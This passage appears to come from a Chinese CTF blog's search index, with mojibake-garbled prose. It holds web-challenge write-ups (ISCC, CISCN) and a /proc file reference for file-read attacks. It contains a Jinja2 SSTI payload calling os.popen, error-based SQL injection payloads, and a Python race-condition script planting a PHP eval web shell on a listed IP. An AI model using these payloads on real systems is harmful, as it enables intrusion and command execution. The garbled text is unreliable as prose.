c=(b,b,dict(doc=a)|join,b,b)|join%}{%set g=(x|attr(c)|list)|attr(a)(320)%}{%set gl=(b,b,dict(globals=a)|join,b,b)|join%}{%set bu=(b,b,dict(builtins=a)|join,b,b)|join%}{% set cr=(lipsum|attr(gl)|attr(&quot;get&quot;)(bu))[&quot;ch&quot;&quot;r&quot;] %}{%set d=cr(42)%}{% set or=(&quot;find / -name &quot;,d,&quot;fla&quot;,d)|join%}{% set or1 = &quot;cat /usr/fla??is?here?txt&quot;%}{{(lipsum|attr(gl)|attr(&quot;get&quot;)(&quot;o&quot;&quot;s&quot;)|attr(&quot;po&quot;&quot;pen&quot;)(or1))|attr(&quot;read&quot;)()}} å°ç»“ï¼šè‡³æ­¤ webçš„æ‰€æœ‰é¢˜ç›®éƒ½akã€‚å­¦åˆ°äº†å¾ˆå¤š~","link":"/2021/05/02/ISCCweb%E9%A2%98%E8%A7%A3/"},{"title":"CISCN web","text":"easy_sqlè¾“å…¥ä¿¡æ¯ ä¼šæŠ¥é”™ æ ¹æ®æŠ¥é”™ä¿¡æ¯ sqlæ³¨å…¥ éœ€è¦ç”¨â€™)ç»•è¿‡é—­åˆ å› ä¸ºæœ‰æŠ¥é”™ï¼Œå°è¯•æŠ¥é”™æ³¨å…¥: payload: 1')and extractvalue(1,concat('~',(select * from (select * from flag as a join flag b)c)))# è¿™é‡Œçš„åº“åˆç¦ç”¨äº†ï¼Œæƒ³èµ·æ¥ä¸Šæ¬¡å°±æ˜¯ç›´æ¥çŒœè¡¨åä¸ºflagäºæ˜¯ å°è¯•payload: 1')and extractvalue(1,concat('~',(select 1 from flag)))#1')and extractvalue(1,concat('~',(select aaa from fla)))#é€šè¿‡å›æ˜¾å¯ä»¥å‘ç°è¡¨åæœç„¶ä¸ºflag 1')and extractvalue(1,concat('~',(select * from (select * from flag as a join flag b using(id,no))c)))# è·å¾—åˆ—å 1')and extractvalue(1,concat('~',(select `87ed65c7-b43b-4438-a4b7-eed85ab78d4b` from flag)))# éœ€è¦substræˆªå–ï¼š å‚è€ƒæ–‡ç« :https://reader-l.github.io/2020/06/01/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/ easy_sourceçœ‹çœ‹å¤‡ä»½ç›®å½• .index.php.swo &lt;?phpclass User{ private static $c = 0; function a() { return ++self::$c; } function b() { return ++self::$c; } function c() { return ++self::$c; } function d() { return ++self::$c; } function e() { return ++self::$c; } function f() { return ++self::$c; } function g() { return ++self::$c; } function h() { return ++self::$c; } function i() { return ++self::$c; } function j() { return ++self::$c; } function k() { return ++self::$c; } function l() { return ++self::$c; } function m() { return ++self::$c; } function n() { return ++self::$c; } function o() { return ++self::$c; } function p() { return ++self::$c; } function q() { return ++self::$c; } function r() { return ++self::$c; } function s() { return ++self::$c; } function t() { return ++self::$c; } }$rc=$_GET[&quot;rc&quot;];$rb=$_GET[&quot;rb&quot;];$ra=$_GET[&quot;ra&quot;];$rd=$_GET[&quot;rd&quot;];$method= new $rc($ra, $rb);var_dump($method-&gt;$rd()); æ‰¾åˆ°æºç ï¼Œå‘ç°æ˜¯phpåå°„é—®é¢˜ åå°„ç±»ä¸­å­˜åœ¨ä¸¤ä¸ªå‚æ•°çš„å°±æ˜¯ReflectionMethod() å’Œé¢˜ç›®å—ä¸€æ¯›ä¸€æ ·æ¥ä¸‹æ¥å°±çœ‹è¦è¿ç”¨å“ªä¸ªå‡½æ•°äº†: $method=new ReflectionMethod(User,a);var_dump($method-&gt;getDocComment)rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment//æœ‰ä¸ªå‘ ä»–çš„flagæ˜¯è—åœ¨å…¶ä¸­ä¸€ä¸ªæ–¹æ³•çš„æ³¨é‡Šå½“ä¸­çš„ï¼Œéœ€è¦éå†ä¸€ä¸‹ï¼rc=ReflectionMethod&amp;ra=User&amp;rb=q&amp;rd=getDocComment PHPæ‰‹å†Œ:https://www.php.net/manual/zh/class.reflectionmethod.php middle_sourceä¸€å¼€å§‹æ‰«æç›®å½•ï¼Œè·å¾—you_can_seeeeeeee_me.php å‘ç°æ˜¯phpinfoçš„é…ç½®æ–‡ä»¶ ../../../../../../../../../../var/lib/php/sessions/fjjefccdjd çœ‹åˆ°å¾ˆå¥‡æ€ªçš„sessionç›®å½•â€”â€”&gt;è€ƒç‚¹æ–‡ä»¶åŒ…å«+åˆ©ç”¨sessionè¿›è¡Œæ–‡ä»¶ä¸Šä¼ ï¼ˆæ¡ä»¶ç«äº‰ï¼‰ import ioimport requestsimport threadingimport timesessid = 'TGAO'data = {&quot;cmd&quot;:&quot;var_dump(scandir('/etc/gcbcgffhac/egdcbahfbh/dedhfgiaai/dajfeeacie/aeebhaaejd/fl444444g'));&quot;,&quot;cf&quot;:&quot;../../../var/lib/php/sessions/fjjefccdjd/sess_&quot;+sessid}def write(session): while True: f = io.BytesIO(b'a' * 1024 * 50) resp = session.post( 'http://124.70.0.162:24693', data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )def read(session): while True: resp = session.post('http://124.70.0.162:24693',data=data) print(resp.text) time.sleep(0.1) # if 'passwd' in resp.text: # print(resp.text) # break # event.clear() else: print(&quot;[+++++++++++++]retry&quot;)if __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: for i in xrange(1,30): threading.Thread(target=write,args=(session,)).start() for i in xrange(1,30): threading.Thread(target=read,args=(session,)).start() event.set() éœ€è¦æ³¨æ„çš„æ˜¯ etcçš„ç›®å½•éœ€è¦ä¸€ä¸ªä¸ªè·‘ â€‹```[0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;.pwd.lock&quot; [3]=&gt; string(3) &quot;X11&quot; [4]=&gt; string(12) &quot;adduser.conf&quot; [5]=&gt; string(12) &quot;alternatives&quot; [6]=&gt; string(7) &quot;apache2&quot; [7]=&gt; string(10) &quot;apparmor.d&quot; [8]=&gt; string(3) &quot;apt&quot; [9]=&gt; string(11) &quot;bash.bashrc&quot; [10]=&gt; string(17) &quot;bash_completion.d&quot; [11]=&gt; string(22) &quot;bindresvport.blacklist&quot; [12]=&gt; string(8) &quot;binfmt.d&quot; [13]=&gt; string(15) &quot;ca-certificates&quot; [14]=&gt; string(20) &quot;ca-certificates.conf&quot; [15]=&gt; string(6) &quot;cron.d&quot; [16]=&gt; string(10) &quot;cron.daily&quot; [17]=&gt; string(11) &quot;cron.weekly&quot; [18]=&gt; string(6) &quot;dbus-1&quot; [19]=&gt; string(12) &quot;debconf.conf&quot; [20]=&gt; string(14) &quot;debian_version&quot; [21]=&gt; string(7) &quot;default&quot; [22]=&gt; string(12) &quot;deluser.conf&quot; [23]=&gt; string(4) &quot;dhcp&quot; [24]=&gt; string(4) &quot;dpkg&quot; [25]=&gt; string(11) &quot;environment&quot; [26]=&gt; string(5) &quot;fstab&quot; [27]=&gt; string(8) &quot;gai.conf&quot; [28]=&gt; string(10) &quot;gcbcgffhac&quot; [29]=&gt; string(5) &quot;group&quot; [30]=&gt; string(6) &quot;group-&quot; [31]=&gt; string(7) &quot;gshadow&quot; [32]=&gt; string(8) &quot;gshadow-&quot; [33]=&gt; string(9) &quot;host.conf&quot; [34]=&gt; string(8) &quot;hostname&quot; [35]=&gt; string(5) &quot;hosts&quot; [36]=&gt; string(4) &quot;init&quot; [37]=&gt; string(6) &quot;init.d&quot; [38]=&gt; string(7) &quot;inputrc&quot; [39]=&gt; string(7) &quot;insserv&quot; [40]=&gt; string(12) &quot;insserv.conf&quot; [41]=&gt; string(14) &quot;insserv.conf.d&quot; [42]=&gt; string(5) &quot;issue&quot; [43]=&gt; string(9) &quot;issue.net&quot; [44]=&gt; string(6) &quot;kernel&quot; [45]=&gt; string(11) &quot;ld.so.cache&quot; [46]=&gt; string(10) &quot;ld.so.conf&quot; [47]=&gt; string(12) &quot;ld.so.conf.d&quot; [48]=&gt; string(4) &quot;ldap&quot; [49]=&gt; string(5) &quot;legal&quot; [50]=&gt; string(13) &quot;libaudit.conf&quot; [51]=&gt; string(12) &quot;locale.alias&quot; [52]=&gt; string(10) &quot;locale.gen&quot; [53]=&gt; string(9) &quot;localtime&quot; [54]=&gt; string(8) &quot;logcheck&quot; [55]=&gt; string(10) &quot;login.defs&quot; [56]=&gt; string(11) &quot;logrotate.d&quot; [57]=&gt; string(11) &quot;lsb-release&quot; [58]=&gt; string(10) &quot;machine-id&quot; [59]=&gt; string(5) &quot;magic&quot; [60]=&gt; string(10) &quot;magic.mime&quot; [61]=&gt; string(7) &quot;mailcap&quot; [62]=&gt; string(13) &quot;mailcap.order&quot; [63]=&gt; string(10) &quot;mime.types&quot; [64]=&gt; string(11) &quot;mke2fs.conf&quot; [65]=&gt; string(14) &quot;modules-load.d&quot; [66]=&gt; string(4) &quot;mtab&quot; [67]=&gt; string(5) &quot;mysql&quot; [68]=&gt; string(8) &quot;networks&quot; [69]=&gt; string(13) &quot;nsswitch.conf&quot; [70]=&gt; string(3) &quot;opt&quot; [71]=&gt; string(10) &quot;os-release&quot; [72]=&gt; string(8) &quot;pam.conf&quot; [73]=&gt; string(5) &quot;pam.d&quot; [74]=&gt; string(6) &quot;passwd&quot; [75]=&gt; string(7) &quot;passwd-&quot; [76]=&gt; string(4) &quot;perl&quot; [77]=&gt; string(3) &quot;php&quot; [78]=&gt; string(7) &quot;profile&quot; [79]=&gt; string(9) &quot;profile.d&quot; [80]=&gt; string(9) &quot;python3.8&quot; [81]=&gt; string(8) &quot;rc.local&quot; [82]=&gt; string(5) &quot;rc0.d&quot; [83]=&gt; string(5) &quot;rc1.d&quot; [84]=&gt; string(5) &quot;rc2.d&quot; [85]=&gt; string(5) &quot;rc3.d&quot; [86]=&gt; string(5) &quot;rc4.d&quot; [87]=&gt; string(5) &quot;rc5.d&quot; [88]=&gt; string(5) &quot;rc6.d&quot; [89]=&gt; string(5) &quot;rcS.d&quot; [90]=&gt; string(11) &quot;resolv.conf&quot; [91]=&gt; string(3) &quot;rmt&quot; [92]=&gt; string(9) &quot;securetty&quot; [93]=&gt; string(8) &quot;security&quot; [94]=&gt; string(7) &quot;selinux&quot; [95]=&gt; string(6) &quot;shadow&quot; [96]=&gt; string(7) &quot;shadow-&quot; [97]=&gt; string(6) &quot;shells&quot; [98]=&gt; string(4) &quot;skel&quot; [99]=&gt; string(3) &quot;ssl&quot; [100]=&gt; string(6) &quot;subgid&quot; [101]=&gt; string(7) &quot;subgid-&quot; [102]=&gt; string(6) &quot;subuid&quot; [103]=&gt; string(7) &quot;subuid-&quot; [104]=&gt; string(11) &quot;sysctl.conf&quot; [105]=&gt; string(8) &quot;sysctl.d&quot; [106]=&gt; string(7) &quot;systemd&quot; [107]=&gt; string(8) &quot;terminfo&quot; [108]=&gt; string(8) &quot;timezone&quot; [109]=&gt; string(10) &quot;tmpfiles.d&quot; [110]=&gt; string(8) &quot;ucf.conf&quot; [111]=&gt; string(4) &quot;udev&quot; [112]=&gt; string(3) &quot;ufw&quot; [113]=&gt; string(13) &quot;update-motd.d&quot; [114]=&gt; string(3) &quot;vim&quot; [115]=&gt; string(6) &quot;wgetrc&quot; [116]=&gt; string(3) &quot;xdg&quot;}â€‹```â€‹``` [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;egdcbahfbh&quot;â€‹```â€‹```dedhfgiaaiâ€‹```â€‹``` [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;aeebhaaejd&quot;}â€‹``` è·å¾—å¦‚ä¸Šç›®å½•ï¼Œå¹¶åœ¨æœ€åçš„ä¸€ä¸ªç›®å½•ä¸‹å‘ç°äº†fl44444gï¼Œç„¶åç›´æ¥æ–‡ä»¶åŒ…å«å³å¯","link":"/2021/05/25/CISCN-web/"},{"title":"CTFä¸­linuxé‡è¦æ–‡ä»¶ç›®å½•å°ç»“ï¼ˆæ–‡ä»¶è¯»å–ï¼‰","text":"æœ€è¿‘å‘ç°è¯»å–ç›®å½•ä¹Ÿæ˜¯éœ€è¦ç§¯ç´¯çš„ æ‰€ä»¥åœ¨è¿™é‡Œæ€»ç»“ä¸€ä¸‹: /proc/[pid]/Linux å†…æ ¸æä¾›äº†ä¸€ç§é€šè¿‡ proc æ–‡ä»¶ç³»ç»Ÿï¼Œåœ¨è¿è¡Œæ—¶è®¿é—®å†…æ ¸å†…éƒ¨æ•°æ®ç»“æ„ã€æ”¹å˜å†…æ ¸è®¾ç½®çš„æœºåˆ¶ã€‚proc æ–‡ä»¶ç³»ç»Ÿæ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒåªå­˜åœ¨å†…å­˜å½“ä¸­ï¼Œè€Œä¸å ç”¨å¤–å­˜ç©ºé—´ã€‚å®ƒä»¥æ–‡ä»¶ç³»ç»Ÿçš„æ–¹å¼ä¸ºè®¿é—®ç³»ç»Ÿå†…æ ¸æ•°æ®çš„æ“ä½œæä¾›æ¥å£ã€‚ ç”¨æˆ·å’Œåº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡ proc å¾—åˆ°ç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¹¶å¯ä»¥æ”¹å˜å†…æ ¸çš„æŸäº›å‚æ•°ã€‚ç”±äºç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå¦‚è¿›ç¨‹ï¼Œæ˜¯åŠ¨æ€æ”¹å˜çš„ï¼Œæ‰€ä»¥ç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºè¯»å– proc æ–‡ä»¶æ—¶ï¼Œproc æ–‡ä»¶ç³»ç»Ÿæ˜¯åŠ¨æ€ä»ç³»ç»Ÿå†…æ ¸è¯»å‡ºæ‰€éœ€ä¿¡æ¯å¹¶æäº¤çš„ã€‚ ä¸‹é¢åˆ—å‡ºçš„è¿™äº›æ–‡ä»¶æˆ–å­æ–‡ä»¶å¤¹ï¼Œå¹¶ä¸æ˜¯éƒ½æ˜¯åœ¨ä½ çš„ç³»ç»Ÿä¸­å­˜åœ¨ï¼Œè¿™å–å†³äºä½ çš„å†…æ ¸é…ç½®å’Œè£…è½½çš„æ¨¡å—ã€‚å¦å¤–ï¼Œåœ¨ proc ä¸‹è¿˜æœ‰ä¸‰ä¸ªå¾ˆé‡è¦çš„ç›®å½•ï¼šnetï¼Œscsi å’Œ sysã€‚ sys ç›®å½•æ˜¯å¯å†™çš„ï¼Œå¯ä»¥é€šè¿‡å®ƒæ¥è®¿é—®æˆ–ä¿®æ”¹å†…æ ¸çš„å‚æ•°ï¼Œè€Œ net å’Œ scsi åˆ™ä¾èµ–äºå†…æ ¸é…ç½®ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç³»ç»Ÿä¸æ”¯æŒ scsiï¼Œåˆ™ scsi ç›®å½•ä¸å­˜åœ¨ã€‚ é™¤äº†ä»¥ä¸Šä»‹ç»çš„è¿™äº›ï¼Œè¿˜æœ‰çš„æ˜¯ä¸€äº›ä»¥æ•°å­—å‘½åçš„ç›®å½•ï¼Œå®ƒä»¬æ˜¯è¿›ç¨‹ç›®å½•ã€‚ç³»ç»Ÿä¸­å½“å‰è¿è¡Œçš„æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰å¯¹åº”çš„ä¸€ä¸ªç›®å½•åœ¨ proc ä¸‹ï¼Œä»¥è¿›ç¨‹çš„ PID å·ä¸ºç›®å½•åï¼Œå®ƒä»¬æ˜¯è¯»å–è¿›ç¨‹ä¿¡æ¯çš„æ¥å£ã€‚è€Œ self ç›®å½•åˆ™æ˜¯è¯»å–è¿›ç¨‹æœ¬èº«çš„ä¿¡æ¯æ¥å£ï¼Œæ˜¯ä¸€ä¸ª linkã€‚ /proc/[pid]/auxv/proc/[pid]/auxv åŒ…å«ä¼ é€’ç»™è¿›ç¨‹çš„ ELF è§£é‡Šå™¨ä¿¡æ¯ï¼Œæ ¼å¼æ˜¯æ¯ä¸€é¡¹éƒ½æ˜¯ä¸€ä¸ª unsigned longé•¿åº¦çš„ ID åŠ ä¸Šä¸€ä¸ª unsigned long é•¿åº¦çš„å€¼ã€‚æœ€åä¸€é¡¹ä»¥è¿ç»­çš„ä¸¤ä¸ª 0x00 å¼€å¤´ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š $ hexdump -x /proc/2406/auxv0000000 0021 0000 0000 0000 f000 f7fa 7fff 00000000010 0010 0000 0000 0000 fbff 1f8b 0000 00000000020 0006 0000 0000 0000 1000 0000 0000 00000000030 0011 0000 0000 0000 0064 0000 0000 00000000040 0003 0000 0000 0000 0040 0040 0000 00000000050 0004 0000 0000 0000 0038 0000 0000 00000000060 0005 0000 0000 0000 0007 0000 0000 00000000070 0007 0000 0000 0000 0000 0000 0000 00000000080 0008 0000 0000 0000 0000 0000 0000 00000000090 0009 0000 0000 0000 55e0 0045 0000 000000000a0 000b 0000 0000 0000 0000 0000 0000 000000000b0 000c 0000 0000 0000 0000 0000 0000 000000000c0 000d 0000 0000 0000 0000 0000 0000 000000000d0 000e 0000 0000 0000 0000 0000 0000 000000000e0 0017 0000 0000 0000 0000 0000 0000 000000000f0 0019 0000 0000 0000 f079 f7f6 7fff 00000000100 001f 0000 0000 0000 ffea f7f6 7fff 00000000110 000f 0000 0000 0000 f089 f7f6 7fff 00000000120 0000 0000 0000 0000 0000 0000 0000 00000000130 /proc/[pid]/cmdline/proc/[pid]/cmdline æ˜¯ä¸€ä¸ªåªè¯»æ–‡ä»¶ï¼ŒåŒ…å«è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤è¡Œä¿¡æ¯ã€‚å¦‚æœè¯¥è¿›ç¨‹å·²ç»è¢«äº¤æ¢å‡ºå†…å­˜æˆ–è€…è¿™ä¸ªè¿›ç¨‹æ˜¯ zombie è¿›ç¨‹ï¼Œåˆ™è¿™ä¸ªæ–‡ä»¶æ²¡æœ‰ä»»ä½•å†…å®¹ã€‚è¯¥æ–‡ä»¶ä»¥ç©ºå­—ç¬¦ null è€Œä¸æ˜¯æ¢è¡Œç¬¦ä½œä¸ºç»“æŸæ ‡å¿—ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š $ ps aux|grep frpsroot 2406 0.1 0.1 54880 10524 ? Sl Dec11 21:30 frps -c ./frps.ini$ cat /proc/2406/cmdlinefrps-c./frps.ini /proc/[pid]/comm/proc/[pid]/comm åŒ…å«è¿›ç¨‹çš„å‘½ä»¤åã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š $ cat /proc/2406/commfrps /proc/[pid]/cwd/proc/[pid]/cwd æ˜¯è¿›ç¨‹å½“å‰å·¥ä½œç›®å½•çš„ç¬¦å·é“¾æ¥ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š $ ls -lt /proc/2406/cwdlrwxrwxrwx 1 root root 0 Dec 12 20:39 /proc/2406/cwd -&gt; /home/mike/frp_0.13.0_linux_amd64 /proc/[pid]/environ/proc/[pid]/environ æ˜¾ç¤ºè¿›ç¨‹çš„ç¯å¢ƒå˜é‡ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š $ strings /proc/2406/environSUPERVISOR_GROUP_NAME=sshTERM=linuxSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=sshRUNLEVEL=2UPSTART_EVENTS=runlevelPREVLEVEL=NPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/binUPSTART_INSTANCE=UPSTART_JOB=rcSUPERVISOR_ENABLED=1runlevel=2PWD=/previous=N /proc/[pid]/exe/proc/[pid]/exe ä¸ºå®é™…è¿è¡Œç¨‹åºçš„ç¬¦å·é“¾æ¥ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š $ ls -lt /proc/2406/exelrwxrwxrwx 1 root root 0 Dec 11 19:00 /proc/2406/exe -&gt; /usr/bin/frps /proc/[pid]/fd/proc/[pid]/fd æ˜¯ä¸€ä¸ªç›®å½•ï¼ŒåŒ…å«è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æƒ…å†µã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š $ ls -lt /proc/2406/fdlrwx------ 1 root root 64 Dec 24 09:39 77 -&gt; socket:[44377722]lrwx------ 1 root root 64 Dec 17 15:07 47 -&gt; socket:[29482617]lr-x------ 1 root root 64 Dec 12 20:18 0 -&gt; pipe:[13282]l-wx------ 1 root root 64 Dec 12 20:18 1 -&gt; pipe:[13283]lrwx------ 1 root root 64 Dec 12 20:18 10 -&gt; socket:[12238218]lrwx------ 1 root root 64 Dec 12 20:18 4 -&gt; anon_inode:[eventpoll]lrwx------ 1 root root 64 Dec 12 20:18 40 -&gt; socket:[19378614] ç›®å½•ä¸­çš„æ¯ä¸€é¡¹éƒ½æ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘æ‰“å¼€çš„æ–‡ä»¶ï¼Œæ•°å­—åˆ™ä»£è¡¨æ–‡ä»¶æè¿°ç¬¦ã€‚ /proc/[pid]/latency/proc/[pid]/latency æ˜¾ç¤ºå“ªäº›ä»£ç é€ æˆçš„å»¶æ—¶æ¯”è¾ƒå¤§ã€‚å¦‚æœè¦ä½¿ç”¨è¿™ä¸ªç‰¹æ€§éœ€è¦æ‰§è¡Œï¼š $ echo 1 &gt; /proc/sys/kernel/latencytop ä¸¾ä¾‹å¦‚ä¸‹ $ cat /proc/2406/latencyLatency Top version : v0.130667 10650491 4891 poll_schedule_timeout do_sys_poll SyS_poll system_call_fastpath 0x7f636573dc1d8 105 44 futex_wait_queue_me futex_wait do_futex SyS_futex system_call_fastpath 0x7f6365a167bc æ¯ä¸€è¡Œå‰ä¸‰ä¸ªæ•°å­—åˆ†åˆ«æ˜¯åé¢ä»£ç æ‰§è¡Œçš„æ¬¡æ•°ã€æ€»å…±æ‰§è¡Œå»¶è¿Ÿæ—¶é—´(å•ä½æ˜¯å¾®ç§’)å’Œæœ€é•¿æ‰§è¡Œå»¶è¿Ÿæ—¶é—´(å•ä½æ˜¯å¾®ç§’)ã€‚åé¢åˆ™æ˜¯ä»£ç å®Œæ•´çš„è°ƒç”¨æ ˆã€‚ /proc/[pid]/maps/proc/[pid]/maps æ˜¾ç¤ºè¿›ç¨‹çš„å†…å­˜åŒºåŸŸæ˜ å°„ä¿¡æ¯ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š $ cat /proc/2406/maps00400000-006ea000 r-xp 00000000 fd:01 1727569 /usr/bin/frps006ea000-00a6c000 r--p 002ea000 fd:01 1727569 /usr/bin/frps00a6c000-00ab1000 rw-p 0066c000 fd:01 1727569 /usr/bin/frps00ab1000-00ad4000 rw-p 00000000 00:00 0c000000000-c00000b000 rw-p 00000000 00:00 0c41feac000-c420000000 rw-p 00000000 00:00 0c420000000-c420400000 rw-p 00000000 00:00 0c420400000-c420700000 rw-p 00000000 00:00 0c420700000-c420800000 rw-p 00000000 00:00 0c420800000-c420900000 rw-p 00000000 00:00 0c420900000-c420a00000 rw-p 00000000 00:00 0c420a00000-c421ea0000 rw-p 00000000 00:00 0c421ea0000-c422a00000 rw-p 00000000 00:00 0c422a00000-c422a60000 rw-p 00000000 00:00 07f0418c01000-7f0418ee1000 rw-p 00000000 00:00 07ffff7f4f000-7ffff7f70000 rw-p 00000000 00:00 0 [stack:5121]7ffff7fad000-7ffff7faf000 r--p 00000000 00:00 0 [vvar]7ffff7faf000-7ffff7fb1000 r-xp 00000000 00:00 0 [vdso]ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] å…¶ä¸­æ³¨æ„çš„ä¸€ç‚¹æ˜¯ [stack:] æ˜¯çº¿ç¨‹çš„å †æ ˆä¿¡æ¯ï¼Œå¯¹åº”äº /proc/[pid]/task/[tid]/ è·¯å¾„ã€‚ /proc/[pid]/root/proc/[pid]/root æ˜¯è¿›ç¨‹æ ¹ç›®å½•çš„ç¬¦å·é“¾æ¥ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š $ ls -lt /proc/2406/rootlrwxrwxrwx 1 root root 0 Dec 12 20:39 /proc/2406/root -&gt; / /proc/[pid]/stack/proc/[pid]/stack ç¤ºå½“å‰è¿›ç¨‹çš„å†…æ ¸è°ƒç”¨æ ˆä¿¡æ¯ï¼Œåªæœ‰å†…æ ¸ç¼–è¯‘æ—¶æ‰“å¼€äº† CONFIG_STACKTRACE ç¼–è¯‘é€‰é¡¹ï¼Œæ‰ä¼šç”Ÿæˆè¿™ä¸ªæ–‡ä»¶ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š $ cat /proc/2406/stack[&lt;ffffffff810fa996&gt;] futex_wait_queue_me+0xc6/0x130[&lt;ffffffff810fb05d&gt;] futex_wait+0x17d/0x270[&lt;ffffffff810fd2d5&gt;] do_futex+0xd5/0x520[&lt;ffffffff810fd791&gt;] SyS_futex+0x71/0x150[&lt;ffffffff8180cc76&gt;] entry_SYSCALL_64_fastpath+0x16/0x75[&lt;ffffffffffffffff&gt;] 0xffffffffffffffff /proc/[pid]/statm/proc/[pid]/statm æ˜¾ç¤ºè¿›ç¨‹æ‰€å ç”¨å†…å­˜å¤§å°çš„ç»Ÿè®¡ä¿¡æ¯ã€‚åŒ…å«ä¸ƒä¸ªå€¼ï¼Œåº¦é‡å•ä½æ˜¯ page(pageå¤§å°å¯é€šè¿‡ getconf PAGESIZE å¾—åˆ°)ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š $ cat /proc/2406/statm 13720 2617 493 746 0 12007 0 å„ä¸ªå€¼å«ä¹‰ï¼š aï¼‰è¿›ç¨‹å ç”¨çš„æ€»çš„å†…å­˜bï¼‰è¿›ç¨‹å½“å‰æ—¶åˆ»å ç”¨çš„ç‰©ç†å†…å­˜cï¼‰åŒå…¶å®ƒè¿›ç¨‹å…±äº«çš„å†…å­˜dï¼‰è¿›ç¨‹çš„ä»£ç æ®µeï¼‰å…±äº«åº“(ä»2.6ç‰ˆæœ¬èµ·ï¼Œè¿™ä¸ªå€¼ä¸º0)fï¼‰è¿›ç¨‹çš„å †æ ˆgï¼‰dirty pages(ä»2.6ç‰ˆæœ¬èµ·ï¼Œè¿™ä¸ªå€¼ä¸º0) /proc/[pid]/status/proc/[pid]/status åŒ…å«è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ã€‚å…¶å¾ˆå¤šå†…å®¹ä¸ /proc/[pid]/stat å’Œ /proc/[pid]/statm ç›¸åŒï¼Œä½†æ˜¯å´æ˜¯ä»¥ä¸€ç§æ›´æ¸…æ™°åœ°æ–¹å¼å±•ç°å‡ºæ¥ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š $ cat /proc/2406/statusName: frpsState: S (sleeping)Tgid: 2406Ngid: 0Pid: 2406PPid: 2130TracerPid: 0Uid: 0 0 0 0Gid: 0 0 0 0FDSize: 128Groups: 0NStgid: 2406NSpid: 2406NSpgid: 2406NSsid: 2130VmPeak: 54880 kBVmSize: 54880 kBVmLck: 0 kBVmPin: 0 kBVmHWM: 34872 kBVmRSS: 10468 kBVmData: 47896 kBVmStk: 132 kBVmExe: 2984 kBVmLib: 0 kBVmPTE: 68 kBVmPMD: 20 kBVmSwap: 0 kBHugetlbPages: 0 kBThreads: 11SigQ: 0/31834SigPnd: 0000000000000000ShdPnd: 0000000000000000SigBlk: 0000000000000000SigIgn: 0000000000000000SigCgt: fffffffe7fc1feffCapInh: 0000000000000000CapPrm: 0000003fffffffffCapEff: 0000003fffffffffCapBnd: 0000003fffffffffCapAmb: 0000000000000000Seccomp: 0Cpus_allowed: fCpus_allowed_list: 0-3Mems_allowed: 00000000,00000001Mems_allowed_list: 0voluntary_ctxt_switches: 2251028nonvoluntary_ctxt_switches: 18031 å…³äºä¿¡å·ï¼ˆsignalï¼‰çš„ä¿¡æ¯ï¼šSigQ åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼ˆä¾‹å¦‚ 0/31834ï¼‰ï¼Œå‰é¢è¡¨ç¤ºå½“å‰å¤„åœ¨é˜Ÿåˆ—ä¸­çš„ä¿¡å·ï¼ˆ0ï¼‰ï¼Œåé¢åˆ™è¡¨ç¤ºé˜Ÿåˆ—ä¸€å…±å¯ä»¥å­˜å‚¨å¤šå°‘ä¿¡å·ï¼ˆ31834ï¼‰ï¼›SigPnd è¡¨ç¤ºå½“å‰çº¿ç¨‹ pending çš„ä¿¡å·ï¼Œè€ŒShdPnd åˆ™è¡¨ç¤ºæ•´ä¸ªè¿›ç¨‹ pending çš„ä¿¡å·ï¼›SigBlkã€SigIgn å’Œ SigCgt åˆ†åˆ«è¡¨ç¤ºå¯¹ä¿¡å·çš„å¤„ç†æ˜¯é˜»å¡ï¼Œå¿½ç•¥ï¼Œè¿˜æ˜¯æ•è·ã€‚ï¼ˆå…³äºUnixä¿¡å·çš„ç›¸å…³çŸ¥è¯†ï¼Œå¯ä»¥å‚è€ƒ Unix: Dealing with signalsï¼‰ã€‚ /proc/[pid]/syscall/proc/[pid]/syscall æ˜¾ç¤ºå½“å‰è¿›ç¨‹æ­£åœ¨æ‰§è¡Œçš„ç³»ç»Ÿè°ƒç”¨ã€‚ä¸¾ä¾‹å¦‚ä¸‹ï¼š $ cat /proc/2406/syscall202 0xab3730 0x0 0x0 0x0 0x0 0x0 0x7ffff7f6ec68 0x455bb3 